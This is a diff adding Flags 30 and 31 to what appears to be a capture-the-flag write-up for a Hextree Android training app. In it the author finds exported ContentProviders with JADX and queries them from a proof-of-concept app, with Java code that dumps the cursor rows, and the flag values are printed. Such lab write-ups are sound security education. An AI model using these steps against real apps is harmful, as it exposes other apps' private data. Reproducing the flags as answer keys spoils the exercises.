@@ -928,3 +928,157 @@ After opening Flag 20 and running this from my PoC app, the receiver accepted th
 HXT{spoof-notificaiton-result-er12d}
 ```
 
+# Content-and FileProviders
+
+# Flag 30 — Accessing an Exported Content Provider
+
+After opening the APK in **JADX-GUI**, I inspected the `AndroidManifest.xml` and looked for exported `ContentProvider`s. I found `Flag30Provider`:
+
+```xml
+<provider
+    android:name="io.hextree.attacksurface.providers.Flag30Provider"
+    android:enabled="true"
+    android:exported="true"
+    android:authorities="io.hextree.flag30"/>
+```
+
+The important parts were `android:exported="true"` and the authority:
+
+```text
+io.hextree.flag30
+```
+
+Since the provider was exported and did not require any read or write permission, I could access it from my own PoC application.
+
+I then opened `Flag30Provider` in **JADX** and inspected the `query()` method. I found that it only processes requests when the URI path is `/success`:
+
+```java
+if (!uri.getPath().equals("/success")) {
+    return null;
+}
+```
+
+Combining the authority with this path gave me the ContentProvider URI:
+
+```text
+content://io.hextree.flag30/success
+```
+
+I then queried this URI from my PoC app using:
+
+```java
+Cursor cursor = getContentResolver().query(
+    Uri.parse("content://io.hextree.flag30/success"),
+    null,
+    null,
+    null,
+    null
+);
+```
+
+Since the result was returned as a `Cursor`, I iterated through it and displayed all the column names and values:
+
+```java
+if (cursor != null && cursor.moveToFirst()) {
+    do {
+        StringBuilder sb = new StringBuilder();
+
+        for (int i = 0; i < cursor.getColumnCount(); i++) {
+            if (sb.length() > 0) {
+                sb.append(", ");
+            }
+
+            sb.append(
+                cursor.getColumnName(i) + " = " +
+                cursor.getString(i)
+            );
+        }
+
+        Log.d("evil", sb.toString());
+
+    } while (cursor.moveToNext());
+}
+```
+
+I used the returned values in my PoC application to display the Cursor contents on the screen. The result showed:
+
+```text
+id = 1, name = flag30, value = HXT{query-provider-table-1vsd8}, visible = 1
+```
+
+From the `value` field, I obtained the flag:
+
+```text
+HXT{query-provider-table-1vsd8}
+```
+
+# Flag 31 — Querying a ContentProvider with a URI Matcher
+
+After opening the APK in **JADX-GUI**, I inspected the `AndroidManifest.xml` and found the exported `Flag31Provider`:
+
+```xml
+<provider
+    android:name="io.hextree.attacksurface.providers.Flag31Provider"
+    android:enabled="true"
+    android:exported="true"
+    android:authorities="io.hextree.flag31"/>
+```
+
+Since the provider is exported, I could access it from my PoC application. I then opened `Flag31Provider` in **JADX** and found a `UriMatcher`:
+
+```java
+uriMatcher2.addURI(AUTHORITY, "flags", 1);
+uriMatcher2.addURI(AUTHORITY, "flag/#", 2);
+```
+
+The `flag/#` pattern means that the provider expects a numeric ID in the URI.
+
+I then inspected the `query()` method and found:
+
+```java
+if (match == 2) {
+    long parseId = ContentUris.parseId(uri);
+
+    if (parseId == 31) {
+        LogHelper logHelper = new LogHelper(getContext());
+        logHelper.addTag(uri.getPath());
+        success(logHelper);
+    }
+```
+
+The important part was:
+
+```java
+if (parseId == 31) {
+    success(logHelper);
+}
+```
+
+This showed me that I needed to use `31` as the ID in the URI.
+
+Using the authority from the manifest and the `flag/#` pattern from the `UriMatcher`, I constructed:
+
+```text
+content://io.hextree.flag31/flag/31
+```
+
+I then queried this URI from my PoC application:
+
+```java
+Cursor cursor = getContentResolver().query(
+    Uri.parse("content://io.hextree.flag31/flag/31"),
+    null,
+    null,
+    null,
+    null
+);
+```
+
+I returned and displayed the `Cursor` using the **same Cursor iteration code I used in the previous flag**. The returned data contained:
+
+```text
+HXT{query-uri-matcher-sakj1}
+```
+
+**Flag:** `HXT{query-uri-matcher-sakj1}`
+
